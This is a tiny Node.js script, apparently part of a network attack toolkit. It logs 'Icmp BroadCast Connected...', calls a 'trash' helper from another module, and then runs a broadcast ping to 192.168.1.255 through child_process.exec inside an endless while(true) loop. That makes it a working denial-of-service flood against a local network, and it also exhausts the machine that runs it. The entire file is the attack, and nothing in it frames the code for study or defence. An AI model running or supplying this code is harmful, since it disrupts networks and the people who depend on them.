console.log(`\x1b[1;35mIcmp BroadCast Connected...\x1b[0m`);const trash = require('../plugin/memory.js');trash();trash('icmp.js');
const { exec } = require('child_process');function icmp(){exec('ping -b 192.168.1.255');}while(true){icmp()}
